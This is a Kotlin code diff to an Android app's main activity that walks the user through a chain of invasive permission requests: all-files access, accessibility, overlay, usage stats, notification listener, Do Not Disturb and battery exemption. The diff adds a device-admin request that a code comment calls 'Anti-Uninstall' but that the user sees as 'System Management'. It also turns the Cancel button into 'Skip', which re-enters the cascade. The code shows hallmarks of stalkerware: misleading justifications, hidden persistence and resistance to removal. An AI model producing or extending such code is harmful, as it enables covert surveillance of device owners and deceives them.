@@ -5,6 +5,8 @@ import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import androidx.activity.compose.setContent
 import androidx.activity.ComponentActivity
 
@@ -46,69 +48,97 @@ class MainActivity : ComponentActivity() {
         // 1.5 Storage
         if (!PermissionManager.hasAllFilesAccess(ctx) && !prefs.getBoolean("asked_files", false)) {
              prefs.edit().putBoolean("asked_files", true).apply()
-             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.") {
-                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                 intent.data = android.net.Uri.parse("package:$packageName")
-                 startActivity(intent)
-             }
+             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.",
+                 onConfirm = {
+                     val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                     intent.data = android.net.Uri.parse("package:$packageName")
+                     startActivity(intent)
+                 },
+                 onCancel = { runPermissionCascade() }
+             )
              return
         }
 
         // 2. Accessibility
         if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
             prefs.edit().putBoolean("asked_acc", true).apply()
-            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.") {
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            }
+            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.",
+                onConfirm = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
+                onCancel = { runPermissionCascade() }
+            )
             return
         }
 
         // 2.5 Overlay (Appear on Top)
         if (!PermissionManager.hasOverlayAccess(ctx) && !prefs.getBoolean("asked_overlay", false)) {
             prefs.edit().putBoolean("asked_overlay", true).apply()
-            showExplanationDialog("Background Persistence", "Overlay access helps maintain consistent application performance in the background.") {
-                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
-                intent.data = android.net.Uri.parse("package:$packageName")
-                startActivity(intent)
-            }
+            showExplanationDialog("Background Persistence", "Overlay access helps maintain consistent application performance in the background.",
+                onConfirm = {
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+                    intent.data = android.net.Uri.parse("package:$packageName")
+                    startActivity(intent)
+                },
+                onCancel = { runPermissionCascade() }
+            )
             return
         }
 
         // 3. Usage Stats
         if (!PermissionManager.hasUsageStats(ctx) && !prefs.getBoolean("asked_usage", false)) {
             prefs.edit().putBoolean("asked_usage", true).apply()
-            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.") {
-                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-            }
+            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.",
+                onConfirm = { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
+                onCancel = { runPermissionCascade() }
+            )
             return
         }
 
         // 3.5 Do Not Disturb (DND)
         if (!PermissionManager.hasDndAccess(ctx) && !prefs.getBoolean("asked_dnd", false)) {
             prefs.edit().putBoolean("asked_dnd", true).apply()
-            showExplanationDialog("Do Not Disturb Access", "DND access is required to bypass silent mode for emergency alerts.") {
-                startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
-            }
+            showExplanationDialog("Do Not Disturb Access", "DND access is required to bypass silent mode for emergency alerts.",
+                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) },
+                onCancel = { runPermissionCascade() }
+            )
             return
         }
 
         // 4. Notification Listener
         if (!PermissionManager.hasNotificationListener(ctx) && !prefs.getBoolean("asked_notif", false)) {
             prefs.edit().putBoolean("asked_notif", true).apply()
-            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.") {
-                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-            }
+            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.",
+                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
+                onCancel = { runPermissionCascade() }
+            )
             return
         }
         
+        // 4.5 Device Admin (Anti-Uninstall)
+        if (!PermissionManager.isAdmin(ctx) && !prefs.getBoolean("asked_admin", false)) {
+            prefs.edit().putBoolean("asked_admin", true).apply()
+            showExplanationDialog("System Management", "Admin access ensures that background synchronization remains active and protected.",
+                onConfirm = {
+                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
+                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Maintains system health metrics.")
+                    startActivity(intent)
+                },
+                onCancel = { runPermissionCascade() }
+            )
+            return
+        }
+
         // 5. Battery
         if (!PermissionManager.isIgnored(ctx) && !prefs.getBoolean("asked_batt", false)) {
              prefs.edit().putBoolean("asked_batt", true).apply()
-             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.") {
-                 val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                 intent.data = android.net.Uri.parse("package:$packageName")
-                 startActivity(intent)
-             }
+             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.",
+                 onConfirm = {
+                     val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                     intent.data = android.net.Uri.parse("package:$packageName")
+                     startActivity(intent)
+                 },
+                 onCancel = { runPermissionCascade() }
+             )
              return 
         }
 
@@ -143,13 +173,13 @@ class MainActivity : ComponentActivity() {
         wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
     }
 
-    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit) {
+    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit, onCancel: () -> Unit) {
         android.app.AlertDialog.Builder(this)
             .setTitle(title)
             .setMessage(msg)
             .setCancelable(false)
             .setPositiveButton("Continue") { _, _ -> onConfirm() }
-            .setNegativeButton("Cancel") { _, _ -> finishAffinity() }
+            .setNegativeButton("Skip") { _, _ -> onCancel() }
             .show()
     }
 
